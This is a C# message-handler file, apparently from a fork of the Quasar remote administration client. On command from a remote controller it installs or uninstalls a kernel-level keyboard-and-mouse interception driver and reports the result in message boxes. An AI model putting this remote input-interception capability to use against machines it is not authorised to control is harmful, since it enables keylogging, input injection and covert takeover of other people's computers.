using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Threading;

using Quasar.Client.Interception;
using System.Windows.Forms;

using InputInterceptorNS;

namespace Quasar.Client.Messages
{
    public class KBMDriverHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is CmdInstallKBMDriver || 
                                                    message is CmdUninstallKBMDriver;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case CmdInstallKBMDriver msg:
                    Execute(sender, msg);
                    break;
                case CmdUninstallKBMDriver msg:
                    Execute(sender, msg);
                    break;
            }
        }

        public void Execute(ISender client, CmdInstallKBMDriver message)
        {
            bool alreadyInstalled;
            string stdout = "";
            string stderr = "";
            //InterceptionHelper.InstallInterception(out alreadyInstalled, out stdout, out stderr);

            InputInterceptor.InstallDriver(out alreadyInstalled, out stdout, out stderr);
      
            if (alreadyInstalled)
            {
                MessageBox.Show("Driver is already installed");
                InterceptionHelper.InitializeDriver();
                return;
            }
            string tempText = "";
            if (stdout.Length > 0)
                tempText += stdout;
            tempText += "------\n";
            if (stderr.Length > 0)
                tempText += stderr;
            MessageBox.Show(tempText);
            InterceptionHelper.InitializeDriver();
            return;
           // client.Send(new SetStatus { Message = "Successfully displayed MessageBox" });
        }

        public void Execute(ISender client, CmdUninstallKBMDriver message)
        {
            //if (client.interceptionCtx != IntPtr.Zero)
            //{
            //    InterceptionDriver.DestroyContext(client.interceptionCtx);
            //    client.interceptionCtx = IntPtr.Zero;
            //    client.interceptionMID = 0;
            //    client.interceptionKID = 0;
            //}
            //bool flag11;
            //string text23;
            //string text24;
            //InterceptionHelper.UninstallInterception(out flag11, out text23, out text24);
            //if (flag11)
            //{
            //    MessageBox.Show("Driver is currently not installed");
            //    return;
            //}
            //string text25 = "";
            //if (text23.Length > 0)
            //{
            //    text25 += text23;
            //}
            //text25 += "--------------\n";
            //if (text24.Length > 0)
            //{
            //    text25 += text24;
            //}
            //MessageBox.Show(text25);
            //return;

            bool flag11;
            string text23;
            string text24;

            InputInterceptor.UninstallDriver(out flag11, out text23, out text24);

            //InterceptionHelper.UninstallInterception(out flag11, out text23, out text24);
            if (flag11)
            {
                MessageBox.Show("Driver is currently not installed");
                return;
            }
            string text25 = "";
            if (text23.Length > 0)
            {
                text25 += text23;
            }
            text25 += "--------------\n";
            if (text24.Length > 0)
            {
                text25 += text24;
            }
            MessageBox.Show(text25);
            return;
        }

    }
}
